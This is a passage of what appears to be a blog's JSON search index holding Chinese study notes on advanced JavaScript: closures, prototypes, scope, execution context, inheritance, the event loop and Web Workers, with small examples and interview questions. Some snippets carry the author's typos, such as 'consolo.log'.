//启动循环定时器后不清理    console.log(&#x27;-----&#x27;)&#125;,1000)//clearInterval(intervarId)\n\n闭包\nfunction fn1()&#123;    var a = 4    function fn2()&#123;        console.log(++a)    &#125;    return fn2&#125;var f = fn1()f()//f = null\n\n\n\n","categories":["JavaScript"],"tags":["内存溢出","内存泄漏"]},{"title":"JS高级（二）：数据、变量、内存","url":"/2022/04/17/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E3%80%81%E5%8F%98%E9%87%8F%E3%80%81%E5%86%85%E5%AD%98/","content":"数据\n数据：存储再内存中代表特定信息的东西，本质上是010101……\n\n\n数据的特点：\n可传递\n可运算\n\n\n内存中所有操作的目标：数据\n算数运算\n逻辑运算\n赋值运算\n运行函数\n\n\n\n内存\n内存：内存条通电以后产生的可存储数据的空间（临时的）\n\n\n内存的产生和死亡：内存条（电路板）&#x3D;&#x3D;》通电&#x3D;&#x3D;》产生内存空间&#x3D;&#x3D;》存储数据&#x3D;&#x3D;》断电&#x3D;&#x3D;》内存空间和数据都消失\n一块小内存的2个数据：\n内部存储的数据\n自身的地址值\n\n\n内存分类：\n栈：全局变量&#x2F;局部变量\n堆：对象\n\n\n\n变量\n变量：可变化的量，由变量名和变量值组成\n\n\n每个变量都对应一块小内存，变量名用来查找对应的内存，变量值即是内存中保存的数据\n\n数据、内存、变量的关系\n内存是用来存储数据的空间\n变量（名）是内存的标识\n\n相关问题\nvar a &#x3D; xxx, a内存中保存的是什么？\n\n若xxx是基本数据，则保存的就是这个数据，var a &#x3D; 3\n\n若xxx是对象，则保存的是对象的地址值，var a &#x3D; {}\n\n若xxx是一个变量，则保存的是xxx的内存内容（可能是基本数据，也可能是地址值）\nvar b = &#x27;abc&#x27;a = b     //a保存的是&#x27;abc&#x27;b = &#123;&#125;a = b     //a保存的是地址值\n\n\n关于引用变量赋值问题\n\n2个引用变量指向同一个对象，通过一个变量修改对象内部数据，另一个变量看到的是修改之后的数据\nvar obj1 = &#123;name:&#x27;Tom&#x27;&#125;var obj2 = obj1        //obj2保存的是obj1的内存内容，即对象的地址值obj1.name = &#x27;Jack&#x27;console.log(obj2.name) //&#x27;Jack&#x27;function fn(obj)&#123;    obj.name = &#x27;A&#x27;&#125;fn(obj1)console.log(obj2.name) //&#x27;A&#x27;\n\n2个引用变量指向同一个对象，让其中一个引用变量指向另一个对象，另一个引用变量依然指向前一个对象\nvar a = &#123;age:12&#125;var b = a        a = &#123;name:&#x27;BOB&#x27;,age:13&#125;b.age = 14console.log(b.age,a.name,a.age) //14 &#x27;BOB&#x27; 13function fn(obj)&#123;    obj = &#123;age:15&#125;&#125;fn(a)console.log(a.age) // 13\n\n\n在js调用函数传递变量参数时，是值传递还是引用传递？【面试题】\nvar a = 3function fn(a)&#123;    a = a + 1&#125;fn(a)console.log(a)  //3function fn2(obj)&#123;    console.log(obj.name)&#125;var obj = &#123;name:&#x27;Tom&#x27;&#125;fn2(obj)\n\n\n理解1：都是值（基本数据&#x2F;地址值）传递，即永远传递的是变量的值\n理解2：可能是值传递，也可能是引用传递（当变量值为地址值时，有些面试官会称作引用传递）\n\n\nJS引擎如何管理内存？\n\n内存生命周期\n分配小内存空间，得到它的使用权\n存储数据，可以反复进行操作\n释放当前的小内存空间\n\n\n释放内存\n局部变量：函数执行完自动释放\n对象：先成为垃圾对象&#x3D;&#x3D;》再由垃圾回收器回收\n全局变量：刷新页面也不会被释放\n\n\n\n\n\n","categories":["JavaScript"],"tags":["变量","数据","内存"]},{"title":"JS高级（三）：原型与原型链","url":"/2022/04/17/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE/","content":"原型(prototype)函数的prototype属性\n每个函数都有一个prototype属性，它默认指向一个Object空对象（即成为：原型对象）\nconsole.log(Date.prototype,type Date.prototype)function fun()&#123;    &#125;fun.prototype.test = function()&#123;    consolo.log(&#x27;test&#x27;)&#125;console.log(fun.prototype) //默认指向一个Object空对象\n\n原型对象中有一个属性constructor，它指向函数对象\nconsole.log(Date.prototype.constructor===Date)  //trueconsole.log(fun.prototype.constructor===fun)  //true\n\n\n\n\n原型对象\n我们所定义的每一个函数，解析器都会向函数中添加一个属性prototype，这个属性对应着一个对象，这个对象称原型对象\n\n\n若函数以普通函数的形式调用，prototype没有任何作用\n若函数以构造函数的形式调用，它所创建的实例对象中都会有一个隐含的属性，也指向该构造函数的原型对象，可通过___proto__来访问该属性\n\n\nconsole.log(mc.__proto__ == MyClass.prototype);//返回true\n\n\n原型对象就相当于一个公共区域，所有同一个类的实例都可以访问到这个原型对象。\n因此，创建构造函数时，可将对象中共有的属性和方法统一设置到原型对象中。（不用为每个对象创建属性，也不会影响到全局作用域）\n当访问实例对象的一个属性或方法时，会先在实例对象自身中寻找，若没有则会去原型对象中寻找。\n（若再没有则去原型的原型中寻找，直到找到Object对象的原型，Object对象的原型没有原型，如果在Object中依然没有找到，则返回undefined。\n\nfunction Person()&#123;    &#125;Person.prototype.sayName = function()&#123;    alert(this.name);&#125;;\n\n\n使用in检查对象中是否有某属性时，如果对象中没有但原型中有，也会返回true\n可使用对象的hasOwnProperty()来检查对象自身中是否有该属性\n\n给原型对象添加属性(一般是方法)\n作用：函数的所有示例对象自动拥有原型中的属性（方法）\nFun.prototype.test = function()&#123;    consolo.log(&#x27;test()&#x27;)&#125;var fun = new Fun()fun.test()    //输出test()\n\n显式原型和隐式原型\n每个函数function都有一个prototype，即显式原型属性，是在定义函数时自动添加的，默认值是一个空Object对象\n\n每个实例对象都有一个__proto__，即隐式原型属性，是在创建对象时自动添加的，默认值为构造函数的prototype属性值\n\n对象的隐式原型的值为其对应的构造函数的显示原型的值\n\n\n\nfunction Fn()&#123;              //内部语句：this.prototype=&#123;&#125;    &#125;console.log(Fn.prototype)   //显式原型var fn = new Fn()           //内部语句：this.__proto__=Fn.prototypeconsolo.log(fn.__proto__)   //隐式原型console.log(Fn.prototype===fn.__proto__)  //true//给原型添加方法Fn.prototype.test = function()&#123;    consolo.log(&#x27;test()&#x27;)&#125;fn.test()    //输出test()\n\n\n\n程序员能直接操作（添加属性）显式原型，但不能直接操作隐式原型（ES6之前）\n\n原型链\n访问一个对象的属性时\n先在自身属性中查找，找到返回\n如果没有，再沿着__proto__这条链向上查找，找到返回\n如果最终没找到，返回undefined\n\n\n别名：隐式原型链\n作用：查找对象的属性（方法）\n\nfunction Fn()&#123;    this.test1 = function()&#123;        console.log(&#x27;test1()&#x27;)    &#125;&#125;Fn.prototype.test2 = function()&#123;    consolo.log(&#x27;test2()&#x27;)&#125;var fn  = new Fn()fn.test1()                //test1()fn.test2()                //test2()consolo.log(fn.toString())//[object Object]consolo.log(fn.test3)     //undefinedfn.test3()                //报错\n\n\n构造函数&#x2F;原型&#x2F;实例对象的关系\n&#96;&#96;&#96;var o1 &#x3D; new Object()var o2 &#x3D; {}\n  ![](https://cdn.jsdelivr.net/gh/Milky53/image-hosting@master/image.69i2t3bncc00.webp)- ```js  function Foo()&#123;&#125;  //相当于以下代码  var Foo = new Function()  Function = new Function()  Object = new Function()  //所有函数的__proto__都是一样的，指向大写Function的显式原型\n\n\n\n函数的显式原型（prototype）指向的对象默认是空Object实例对象（但Object函数不满足）\nconsole.log(Fn.prototype instanceof Object) //trueconsole.log(Object.prototype instanceof Object) //falseconsole.log(Function.prototype instanceof Object) //true\n\n所有函数都是Function()的实例（包含Function本身，即Function是它自身的实例）\nconsole.log(Function.__proto__ === Function.prototype) //true\n\nObject的原型对象是原型链的尽头\nconsole.log(Object.prototype.__proto__) //null\n\n\n\n原型链的属性问题function Fn()&#123;    &#125;Fn.prototype.a = &#x27;xxx&#x27;    //一般情况下不会在原型上添加属性，而是方法var fn1 = new Fn()consolo.log(fn1.a)var fn2 = new Fn()fn2.a = &#x27;yyy&#x27;consolo.log(fn1.a,fn2.a)\n\n\n读取对象的属性值时：会自动到原型链中查找\n\n设置对象的属性值时：不会查找原型链，如果当前对象中没有此属性，直接添加此属性并设置其值\n\n方法一般定义在原型中，属性一般通过构造函数定义在对象本身上\n每个对象都有自己的属性，但方法都在原型里\nfunction Person(name,age)&#123;    this.name = name    this.age = age&#125;Person.prototype.setName = function(name)&#123;    this.name = name&#125;var p1 = new Pesson(&#x27;Tom&#x27;,12)p1.setName(&#x27;Bob&#x27;)consolo.lof(p1)var p2 = new Pesson(&#x27;Tom&#x27;,12)p2.setName(&#x27;Cat&#x27;)consolo.log(p1)consolo.log(p1.__proto__===p2.__proto__)  //true\n\n探索instanceofinstanceof是如何判断的？\n表达式：A instanceof B\nA是实例对象（有__proto__)，B是构造函数对象（有prototype)\n\n如果B函数的显式原型对象在A对象的原型链上，返回true，否则返回false\n\n案例1：\n\n\nfunction Foo()&#123;    &#125;var f1 = new Foo()console.log(f1 instanceof Foo) //trueconsole.log(f1 instanceof Object) //true\n\n\n\n案例2\n\nconsole.log(Object instanceof Function) //trueconsole.log(Object instanceof Object) //trueconsole.log(Function instanceof Function) //trueconsole.log(Function instanceof Object) //truefunction Foo()&#123;&#125;console.log(Object instanceof Foo) //false\n\n\n\n以上这幅图可借助3句话画出：\n所有实例对象的隐式原型就是其构造函数的显式原型\n所有函数的原型对象都是空Object实例对象，Object()除外\n所有函数都是Function()的实例对象，包含Function本身\n\n\n\n面试题\n测试题1\nfunction A()&#123;&#125;A.prototype.n = 1var b = new A()A.prototype = &#123;    n:2,    m:3&#125;var c = new A()consolo.log(b.n,b.m,c.n,c.m) //1 undefined 2 3\n\n测试题2\nfunction F()&#123;&#125;Object.prototype.a = function()&#123;    console.log(&#x27;a()&#x27;)&#125;Function.prototype.b = function()&#123;    console.log(&#x27;b()&#x27;)&#125;var f = new F()f.a()    //a()f.b()    //报错F.a()    //a()F.b()    //b()\n\n","categories":["JavaScript"],"tags":["原型","原型链"]},{"title":"JS高级（九）：线程机制与事件机制","url":"/2022/04/19/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%9C%BA%E5%88%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6/","content":"进程与线程进程（process）\n程序的一次执行，它占有一片独有的内存空间\n可通过winodws任务管理器查看进程\n\n线程（thread）\n是进程内的一个独立执行单元\n是程序执行的一个完整流程\n是CPU的最小调度单元\n\n\n相关知识\n应用程序必须运行在某个进程的某个线程上\n一个进程中至少有一个运行的线程：主线程，进程启动过后自动创建\n一个进程中也可以同时运行多个线程，称该程序是多线程运行的\n一个进程内的数据可以供其中的多个线程直接共享\n多个进程之间的数据是不能直接共享的\n线程池（thread pool）：保存多个线程对象的容器，实现线程对象的反复利用\n\n相关问题\n何为多进程与多线程？\n多进程：一个应用程序可以同时开启多个实例运行，比如chrome浏览器可以开很多个\n多线程：在一个进程内，同时有多个线程运行\n\n\n单线程与多线程的区别？\n多线程\n优点\n有效提升CPU的利用率\n\n\n缺点\n创建多线程开销\n线程间切换开销\n死锁与状态同步问题\n\n\n\n\n单线程\n优点：顺序编程简单易懂\n缺点：效率低\n\n\n\n\nJS是单线程的还是多线程的？\njs是单线程运行的\n但使用H5中的Web Workers可以多线程运行\n\n\n浏览器运行时单线程还是多线程？\n多线程\n\n\n浏览器运行时单进程还是多进程？\n有的是多进程：chrome、新版IE\n有的是单进程：老版IE\n\n\n\n浏览器内核\n支撑浏览器运行的最核心的程序\n不同浏览器的内核不同\nChrome，Safari：webkit\nfirefox：Gecko\nIE：Trident\n360，搜狗等国内浏览器：Trident+webkit\n\n\n内核由很多模块组成\n主线程：\njs引擎模块：负责js程序的编译与运行\nhtml，css文档解析模块：负责页面文本的解析\nDOM&#x2F;CSS模块：负责dom&#x2F;css在内存中的相关处理\n布局和渲染模块：负责页面的布局和效果的绘制（内存中的对象）\n\n\n分线程：\n定时器模块：负责定时器的管理\n事件响应模块：负责事件的管理\n网络请求模块：负责ajax请求\n\n\n\n\n\n定时器引发的思考\n定时器真的是定时执行的吗？\n\n定时器并不能保证真正定时执行\n\n一般会延迟一丁点（可以接受），也可能延迟很长时间（不能接受）\n\n\n\n定时器回调函数实在分线程执行的吗？\n\n在主线程执行的，因为js是单线程的\n\n\n定时器是如何实现的\n\n事件循环模型\n\n\n\njs是单线程执行的\n如何证明js是单线程的？\nsetTimeout()的回调函数是在主线程执行的\n定时器回调函数只有在运行栈中的代码全部执行完后才有可能执行\n\n\n为什么js要用单线程模式，而不用多线程模式？\nJavaScript的单线程，与它的用途有关\n作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM\n这决定了它只能是单线程（只能有1个线程去更新操作界面），否则会带来很复杂的同步问题\n\n\n代码的分类：\n初始化代码\n回调代码\n\n\njs引擎执行代码的基本流程\n先执行初始化代码：包含一些特别的代码 \n设置定时器（回调函数不执行）\n绑定事件监听（回调函数不执行）\n发送ajax请求\n\n\n后面再某个时刻才会执行回调代码：回调函数（异步执行）\n\n\n\n浏览器的事件循环（轮询）模型\n\n所有代码分类\n初始化执行代码（同步代码）：包含绑定dom事件监听，设置定时器，发送ajax请求的代码\n回调执行代码（异步代码）：处理回调函数\n\n\njs引擎执行代码的基本流程：\n初始化代码&#x3D;&#x3D;》回调代码\n\n\n模型的2个重要组成部分：\n事件（定时器&#x2F;DOM&#x2F;ajax）管理模块\n回调队列\n\n\n模型的运转流程\n执行初始化代码，将事件回调函数交给对应模块管理\n当事件发生时，管理模块会将回调函数及其数据添加到回调队列中\n只有当初始化代码执行完后（可能要一定时间），才会遍历读取回调队列中的回调函数执行\n\n\n\n相关概念\n执行栈（execution stack）：所有代码都是再此空间中执行的\n浏览器内核（browser core）：\njs引擎模块（在主线程处理）\n其它模块（在主&#x2F;分线程处理），这里的分线程指的是浏览器的分线程\n\n\n任务队列&#x2F;消息队列&#x2F;事件队列（callback queue）\n事件轮询（event loop）：从任务队列中循环取出回调函数放入执行栈中处理（一个接一个）\n事件驱动模型（event-driven interaction model）：如上图\n请求响应模型（request-response model）\n\nH5 Web Workers(多线程)介绍\nHTML5规范提供了js分线程的实现，取名为：Web Workers\n可以将一些大计算量的代码交由web Worker运行而不冻结用户界面\n但是子线程完全受主线程控制，且不得操作DOM，所以这个新标准并没有改变JavaScript单线程的本质。\n相关API\nWorker：构造函数，加载分线程执行的js文件\nWorker.prototype.onmessage：\n\n\n\n使用\n创建在分线程执行的js文件\nworker.js\nfunction fibonacci(n)&#123;    return n&lt;=2 ? 1 : fibonacci(n-1)+fibonacci(n-2)&#125;var onmessage = function(event)&#123;    var number = event.data    console.log(&#x27;分线程接收到主线程发送的数据：&#x27;+number)    //计算    var result  = fibonacci(number)    postMessage(result)    console.log(&#x27;分线程向主线程返回数据：&#x27;+result)    //alert(result)   //报错，alert是window的方法，在分线程不能调用&#125;\n\n分线程中的全局对象不再是window，所以在分线程中不能操作DOM\n\n在主线程中的js中发消息并设置回调\nvar input = document.getElementById(&#x27;number&#x27;)document.getElementById(&#x27;btn&#x27;).onclick = function()&#123;    var number = input.value    //创建一个Worker对象    var worker = new Worker(&#x27;worker.js&#x27;)    // 绑定接收消息的监听    worker.onmessage = function(event)&#123;        console.log(&#x27;主线程接收分线程返回的数据：&#x27;+event.data)        alert(event.data)    &#125;    //向分线程发送消息    worker.postMessage(number)    console.log(&#x27;主线程向分线程发送数据：&#x27;+number)&#125;\n\n不足\n慢\n不能跨域加载JS\nworker内代码不能访问DOM（更新UI）\n不是每个浏览器都支持这个新特性\n\n","categories":["JavaScript"],"tags":["事件","线程"]},{"title":"JS高级（五）：作用域与作用域链","url":"/2022/04/18/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%93%BE/","content":"作用域理解\n就是一块“地盘”，一个代码段所在的区域\n它是静态的（相对于上下文对象），再编写代码时就确定了\n\n分类\n全局作用域\n\n函数作用域\n\n没有块作用域（ES6有了）\nif(true)&#123;    var c = 3&#125;console.log(c)  //Js可以访问，Java不可以，Java有块作用域\n\n作用\n隔离变量，不同作用域下同名变量不会有冲突\n\n\n作用域与执行上下文区别\n区别1\n全局作用域外，每个函数都会创建自己的作用域，作用域在函数定义时就已经确定了，而不是在函数调用时。\n全局执行上下文环境是在全局作用域确定之后，js代码马上执行之前创建\n函数执行上下文是在调用函数时，函数题代码执行之前创建\n\n\n区别2\n作用域是静态的，只要函数定义好了就一直存在，且不会再变化\n执行上下文是动态的，调用函数时创建，函数调用结束时就会被释放\n\n\n\n联系\n上下文环境（对象）是从属于所在的作用域\n全局上下文环境&#x3D;&#x3D;》全局作用域\n函数上下文环境&#x3D;&#x3D;》对应的函数作用域\n\n作用域链理解\n多个上下级关系的作用域形成的链，它的方向是从下向上（从内到外）\n查找变量时就是沿着这个作用域链来查找的\n\n查找一个变量的查找规则\n在当前作用域下的执行上下文中查找对应的属性，如果有直接返回，否则进入2\n在上一级作用域的执行上下文中查找对应的属性，如果有直接返回，否则进入3\n再次执行2的相同操作，知道全局作用域，如果还找不到就抛出找不到的异常\n\n面试题\n&#96;&#96;&#96;jsvar x &#x3D; 10function fn(){console.log(x)}function show(f){var x &#x3D; 20f()}show(fn)      &#x2F;&#x2F;输出10  作用域是**静态**的，并不会说放在其他函数里执行而改变作用域的位置- ```js  var fn = function()&#123;      console.log(fn)  &#125;  fn()        //输出fn函数  var obj = &#123;      fn2:function()&#123;          console.log(fn2)      &#125;  &#125;  obj.fn2()   //报错，应该改成console.log(this.fn2)\n\n","categories":["JavaScript"],"tags":["作用域"]},{"title":"JS高级（八）：继承模式","url":"/2022/04/19/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E7%BB%A7%E6%89%BF%E6%A8%A1%E5%BC%8F/","content":"原型链继承\n套路：\n定义父类型构造函数\n给父类型的原型添加方法\n定义子类型的构造函数\n创建父类型的对象赋值给子类型的原型\n将子类型原型的构造属性设置为子类型\n给子类型原型添加方法\n创建子类型的对象：可以调用父类型的方法\n\n\n关键：\n子类型的原型为父类型的一个实例对象\n\n\n\n//父类型function Supper()&#123;    this.supProp = &#x27;Supper Property&#x27;&#125;Supper.prototype.showSupperProp = function()&#123;    console.log(this.supProp)&#125;//子类型function Sub()&#123;    this.subProp = &#x27;Sub Property&#x27;&#125;//实现继承:子类型的原型指向父类型的实例对象Sub.prototype = new Supper()//让子类型的原型的constructor指向子类型Sub.prototype.constructor = SubSupper.prototype.showSubProp = function()&#123;    console.log(this.subProp)&#125;var sub = new Sub()sub.showSupperProp()\n\n借用构造函数继承（假继承）\n套路：\n定义父类型构造函数\n定义子类型构造函数\n在子类型构造函数中调用父类型构造\n\n\n关键：\n在子类型构造函数中通用call()调用父类型构造函数\n\n\n\nfunction Person(name,age)&#123;    this.name = name    this.age = age&#125;function Student(name,age,price)&#123;    Person.call(this,name,age)   //相当于:this.Person(name,age)    this.price = price&#125;\n\n原型链+借用构造函数的组合继承\n套路：\n利用原型链实现对父类型对象的方法继承\n利用call()借用父类型构造函数初始化相同属性\n\n\n\nfunction Person(name,age)&#123;    this.name = name    this.age = age&#125;Person.prototype.setName = function(name)&#123;    this.name = name&#125;function Student(name,age,price)&#123;    Person.call(this,name,age)   //为了得到属性    this.price = price&#125;Student.prototype = new Person() //为了能看到父类型的方法  Student.prototype.constructor = StudentStudent.prototype.setPrice = function(price)&#123;    this.price = price&#125;var s = new Student(&#x27;Tom&#x27;,24,15000)s.setName(&#x27;Bob&#x27;)s.setPrice(16000)console.log(s.name,s.age,s.price)\n\n","categories":["JavaScript"],"tags":["继承"]},{"title":"JS高级（六）：闭包","url":"/2022/04/18/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E9%97%AD%E5%8C%85/","content":"闭包理解如何产生闭包？\n当一个嵌套的内部（子）函数引用了嵌套的外部（父）函数的变量（或函数）时，就产生了闭包\n\n闭包是什么？\n使用chrome调试查看\n理解一：闭包是嵌套的内部函数（大部分人理解）\n理解二：包含被引用变量（函数）的对象（少数人理解）\n注意：闭包存在于嵌套的内部函数中\n\n产生闭包的条件？\n函数嵌套\n内部函数引用了外部函数的数据（变量&#x2F;函数）\n执行外部函数（本质上是执行内部函数定义，创建内部函数对象&#x3D;&#x3D;&gt;创建闭包，但不一定要执行内部函数）\n\nfunction fn1()&#123;    var a=2    var b=&#x27;abc&#x27;    function fn2()&#123;        console.log(a)    &#125;&#125;fn1()     //闭包产生了\n\nfunction fn1()&#123;    var a=2    var b=&#x27;abc&#x27;    var fn2 = function()&#123;        console.log(a)    &#125;&#125;fn1()     //闭包没有产生\n\n常见的闭包\n将函数作为另一个函数的返回值\nfunction fn1()&#123;    var a = 2    function fn2()&#123;        a++        console.log(a)    &#125;    return fn2&#125;var f = fn1()   //执行fn1()的同时创建了一个闭包对象，并赋值给ff() //3f() //4\n\n执行fn1()，返回fn2指向的函数对象，创建了一个闭包对象，并将函数（闭包）的地址赋值给f。\n虽然fn1执行结束（断开了fn3的指向函数对象的引用），但闭包一直存在（没有断开f指向函数对象的引用）。\n又因为闭包包含着被引用变量（函数），所以可以操作引用变量的值。\n\n将函数作为实参传递给另一个函数调用\nfunction showDelay(msg,time)&#123;    setTimeout(function()&#123;        alert(msg)    &#125;,time)&#125;showDelay(&#x27;atguigu&#x27;,2000)\n\n闭包的作用\n使函数内部的变量在函数执行完后，仍然存活在内存中（延长了局部变量的生命周期）\n让函数外部可以操作（读写）到函数内部的数据（变量&#x2F;函数）\n\n思考\n函数执行完后，函数内部声明的局部变量是否还存在？\n\n一般不存在\n存在于闭包中的变量才可能存在\n\nfunction fn1()&#123;    var a = 2    function fn2()&#123;        a++        console.log(a)    &#125;    return fn2&#125;var f = fn1()   //执行fn1()的同时创建了一个闭包对象，并赋值给ff() //3f() //4//如果这么写，则不存在fn1()\n\n执行fn1()，返回fn2指向的函数对象，创建了一个闭包对象，并将函数（闭包）的地址赋值给f。\n虽然fn1执行结束（断开了fn3的指向函数对象的引用），但闭包一直存在（没有断开f指向函数对象的引用）。\n又因为闭包包含着被引用变量（函数），所以可以操作引用变量的值。\n\n在函数外部能直接访问函数内部的局部变量吗？\n\n不能，但是可以通过闭包让外部操作它\n\n\n\n闭包的生命周期\n产生：在嵌套内部函数定义执行完时就产生了（不是在调用）\nfunction fn1()&#123;            var a = 2             //2. 在这一行就可以说闭包已经存在了，因为函数声明提升，内部函数对象已经创建了    function fn2()&#123;        a++        console.log(a)    &#125;    return fn2&#125;var f = fn1()    //1.调用\n\nfunction fn1()&#123;            var a = 2                 var fn2 = function()&#123;        a++        console.log(a)    &#125;     //2. 此时在这一行才可以说闭包已经存在了    return fn2&#125;var f = fn1()    //1.调用\n\n\n\n死亡：在嵌套的内部函数成为垃圾对象时\nfunction fn1()&#123;            var a = 2                 function fn2()&#123;        a++        console.log(a)    &#125;    return fn2&#125;var f = fn1()    f()f()f = null    //闭包死亡，包含闭包的函数对象成为垃圾对象（引用它的变量不再引用它了）\n\n闭包的应用定义JS模块\nJS模块：具特定功能的js文件\n​               将所有的数据和功能都封装在一个函数内部（私有的）\n​                只向外暴露一个包括n个方法的对象或函数\n​                模块的使用者，只需要通过模块暴露的对象调用方法来实现对应的功能\n\nmyMoudule.js\nfunction myModule()&#123;    //私有数据    var msg = &#x27;My atguigu&#x27;    //操作数据的函数    function doSomething()&#123;        console.log(&#x27;doSomething() &#x27;+msg.toUpperCase())    &#125;    function doOtherthing()&#123;        console.log(&#x27;doOtherthing() &#x27;+msg.toLowerCase())    &#125;    //向外暴露对象（给外部使用的方法）    return &#123;        doSomething:doSomething,        doOtherthing:doOtherthing    &#125;&#125;\n\nindex.html\n&lt;script type=&quot;text/javascript&quot; src=&quot;myModule.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var module = myModule()    module.doSomething()    module.doOtherthing()&lt;/script&gt;\n\n另一种暴露方法：\nmyMoudule2.js\n(function myModule(window)&#123;    //私有数据    var msg = &#x27;My atguigu&#x27;    //操作数据的函数    function doSomething()&#123;        console.log(&#x27;doSomething() &#x27;+msg.toUpperCase())    &#125;    function doOtherthing()&#123;        console.log(&#x27;doOtherthing() &#x27;+msg.toLowerCase())    &#125;    //向外暴露对象（给外部使用的方法）    window.myMoudule2 =  &#123;        doSomething:doSomething,        doOtherthing:doOtherthing    &#125;&#125;)(window)\n\nindex.html\n&lt;script type=&quot;text/javascript&quot; src=&quot;myModule2.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    myModule2.doSomething()    myModule2.doOtherthing()&lt;/script&gt;\n\n闭包的缺点及解决缺点\n函数执行完后，函数内的局部变量没有释放，占用内存时间会边长\n容易造成内存泄漏\n\n解决\n能不用闭包就不用\n及时释放：f = null（让内部函数成为垃圾对象–》回收闭包）\n\n面试题\n输出什么？\nvar name = &quot;The Window&quot;;var object = &#123;    name:&quot;My Object&quot;,    getNameFun:function()&#123;        return function()&#123;            return this.name        &#125;;    &#125;&#125;;alert(object.getNemaFunc()());   //The Window\n\nobject.getNemaFunc()是一个函数，执行此函数，因为此时是window调用此函数，相当于：window.object.getNemaFunc()(),因此this为window\n此题不存在闭包：存在函数嵌套，但内部函数没有引用外部函数的数据\n\n输出什么？\nvar name2 = &quot;The Window&quot;;var object2 = &#123;    name2:&quot;My Object&quot;,    getNameFun:function()&#123;        var that = this;        return function()&#123;            return that.name2;        &#125;;    &#125;&#125;;alert(object2.getNemaFunc()());   //My Object\n\nobject.getNemaFunc()是一个函数，执行此函数，因为此时是window调用此函数，相当于：window.object.getNemaFunc()()。\n但是在函数中，var that = this，此时的this为调用getNameFun()的对象object2\n此题存在闭包：存在函数嵌套，且内部函数引用了外部函数的数据\n\n输出什么？（难）\nfunction fun(n,o)&#123;    console.log(o)    return &#123;        fun:function(m)&#123;            return fun(m,n);        &#125;    &#125;&#125;var a = fun(0); a.fun(1); a.fun(2); a.fun(3);  //undefined,0,0,0var b = fun(0).fun(1).fun(2).fun(3);  //undefined,0,1,2var c = fun(0).fun(1); c.fun(2); c.fun(3);  //undefined,0,1,1\n\n","categories":["JavaScript"],"tags":["闭包"]},{"title":"JS高级（四）：执行上下文与执行上下文栈","url":"/2022/04/18/JS%E9%AB%98%E7%BA%A7%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%8E%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%A0%88/","content":"变量提升与函数提升变量(声明)提升\n通过var定义（声明）的变量，在定义语句之前就可以访问到\n值：undefined\n\nconsole.log(b) //输出undefinedvar b = 3//相当于以下代码var bconsole.log(b)b = 3\n\n\n\n函数(声明)提升\n通过function声明的函数，在定义语句之前就可以直接调用\n值：函数定义（对象）\n\nfn2()      //可调用 函数提升fn3()      //不能调用 变量提升function fn2()&#123;    console.log(&#x27;fn2()&#x27;)&#125;var fn3 = function()&#123;    consolo.log(&#x27;fn3()&#x27;)&#125;\n\n执行上下文代码分类（按位置）\n全局代码\n函数（局部）代码\n\n全局执行上下文\n在执行全局代码前将window确定为全局执行上下文\n对全局数据进行预处理：\nvar定义的全局变量&#x3D;&#x3D;》undefined，添加为window的属性\nfunction声明的全局函数&#x3D;&#x3D;》赋值（fun），添加为window的方法\nthis&#x3D;&#x3D;》赋值（window）\n\n\n开始执行全局代码\n\n函数执行上下文\n在调用函数，准备执行函数体之前，创建对应的函数执行上下文对象（虚拟对象，存在于栈中）\n对局部数据进行预处理：\n形参变量&#x3D;&#x3D;》赋值（实参），添加为执行上下文的属性\narguments&#x3D;&#x3D;》赋值（实参列表），添加为执行上下文的属性\nvar定义的局部变量&#x3D;&#x3D;》undefined，添加为执行上下文的属性\nfunction声明的函数&#x3D;&#x3D;》赋值（fun），添加为执行上下文的方法\nthis&#x3D;&#x3D;》赋值（调用函数的对象）\n\n\n开始执行函数体代码\n\nfunction fn(a1)&#123;    console.log(a1)          //2    console.log(a2)          //undefined    a3()                     //a3()    console.log(this)        //window    console.log(arguments)   //伪数组（2，3）        var a2 = 3    function a3()&#123;        console.log(&#x27;a3()&#x27;)    &#125;&#125;fn(2,3)\n\n执行上下文栈\n在全局代码执行前，JS引擎就会创建一个栈来存储管理所有的执行上下文对象\n在全局执行上下文（window）确定后，将其添加到栈中（压栈）\n在函数执行上下文创建后，将其添加到栈中（压栈）\n在当前函数执行完后，将栈顶的对象移除（出栈）\n当所有的代码执行完后，栈中只剩下window\n\n                            //1.进入全局执行上下文var a = 10var bar = function(x)&#123;    var b =5    foo(x+b)                //3.进入fn函数执行上下文&#125;var fn = function(y)&#123;    var c =5    console.log(a+c+y)&#125;bar(10)                     //2.进入bar函数执行上下文\n\n\n面试题\n依次输出什么？整个过程中产生了几个执行上下文？\nconsole.log(&#x27;global begin:&#x27;+i)var i = 1foo(1)function foo(i)&#123;    if(i==4)&#123;        return    &#125;    console.log(&#x27;foo() begin:&#x27;+i)    foo(i+1)    console.log(&#x27;foo() end:&#x27;+i)&#125;console.log(&#x27;global begin:&#x27;+i)\n\n输出：\nglobal begin:undefinedfoo() begin:1foo() begin:2foo() begin:3foo() end:3foo() end:2foo() end:1global begin:1\n\n产生了5个执行上下文\n\n&#96;&#96;&#96;jsfunction a(){}var aconsolo.log(typeof a)  &#x2F;&#x2F;‘function’\n  